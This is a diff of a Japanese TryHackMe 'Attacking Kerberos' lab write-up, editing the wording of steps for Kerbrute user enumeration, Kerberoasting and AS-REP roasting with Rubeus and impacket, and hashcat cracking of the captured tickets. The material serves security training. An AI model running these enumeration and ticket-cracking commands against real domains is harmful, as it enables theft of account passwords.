@@ -80,7 +80,7 @@ Enumerating users allows you to know which user accounts are on the target domai
 ----------------------------------------Answer the questions below--------------------------------------------------  
 How many total users do we enumerate?  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_4.png" width="50%" height="50%">  
-「`./kerburute userenum -d ドメイン名 --dc ドメコンIP Wordlist名 -o 出力ファイル`」で列挙をすると、10個のユーザを確認！  
+「`./kerburute userenum -d ドメイン名 --dc ドメコンIP Wordlist名 -o 出力ファイル`」で列挙すると、10個のユーザを確認！  
 （名前解決のための`/etc/hosts`ファイルを編集していない場合、`--dc`オプションはIPアドレスが必須になる。）
 
 
@@ -156,10 +156,10 @@ What is the SQLService Password?
 「`Rubeus.exe kerberoast /nowrap /outfie:出力ファイル名`」でSPNを持つユーザを取得できた。（`/nowrap` はチケットを改行なしで出力）  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_11.png" width="50%" height="50%">  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_12.png" width="100%" height="100%">  
-「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力を取得し  
-「`hashcat -a 0 -m 13100 ハッシュファイル名 Wordlist名`」でハッシュをクラック。（`-m 13100`は`$krb5tgs`形式のHash形式、Johnだとこの形式をサポートしていなかった。）
+「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力をダウンロードし  
+「`hashcat -a 0 -m 13100 TGS名 Passwordリスト名`」でTGSをクラック。（`-m 13100`は`$krb5tgs`形式のHash形式、Johnだとこの形式をサポートしていなかった。）
 
-ちなみに「`impacket-GetUserSPNs ドメイン名/ユーザ名:パスワード -dc-ip IPアドレス -outputfile 出力ファイル`」でも、今回はSSHアカウントを使用してチケットを取得できた。
+ちなみに「`impacket-GetUserSPNs ドメイン名/ユーザ名:パスワード -dc-ip IPアドレス -outputfile 出力ファイル`」の場合、今回はSSHアカウントを使用してチケットを取得できた。
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_13.png" width="100%" height="100%">  
 
 
@@ -195,8 +195,8 @@ What is the User's Password?
 「`Rubeus.exe asreproast /format:hashcat /outfile:出力ファイル名`」で事前認証が無効のユーザのTGTチケットを取得できた。  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_17.png" width="50%" height="50%">  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_18.png" width="100%" height="100%">  
-「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力を取得し  
-「`hashcat -a 0 -m 18200 ハッシュファイル名 Wordlist名`」でハッシュをクラック。（`-m 18200`は`$krb5asrep`形式のHash形式、Johnでもサポートしている。）
+「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力をダウンロードし  
+「`hashcat -a 0 -m 18200 ASREP名 Passwordリスト名`」でASREPをクラック。（`-m 18200`は`$krb5asrep`形式のHash形式、Johnでもサポートしている。）
 
 ちなみに「`impacket-GetNPUsers ドメイン名/ -no-pass -dc-ip IPアドレス -userfile ユーザリスト -outputfile 出力ファイル`」でも、事前認証無効ユーザのTGTを取得できた。  
 「`-userfile`」では、Kerbruteで列挙したユーザを使用した。
